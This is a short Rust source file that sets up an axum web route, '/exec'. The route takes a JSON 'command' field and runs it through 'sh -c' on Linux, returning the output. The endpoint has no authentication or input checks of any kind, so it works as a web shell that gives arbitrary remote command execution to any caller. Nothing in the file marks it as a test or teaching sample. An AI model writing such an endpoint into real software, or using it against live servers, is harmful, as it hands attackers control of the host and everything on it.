use axum::{routing::post, extract::Json, Router};
use serde::Deserialize;
use std::process::Command;

#[derive(Deserialize)]
pub struct ExecPayload {
    pub command: String,
}

pub fn router() -> Router {
    Router::new().route("/exec", post(execute_command))
}

async fn execute_command(Json(payload): Json<ExecPayload>) -> String {
    let output = if cfg!(target_os = "linux") {
        Command::new("sh")
            .arg("-c")
            .arg(&payload.command)
            .output()
    } else {
        return "Unsupported OS".to_string();
    };

    match output {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(e) => format!("Error: {}", e),
    }
}
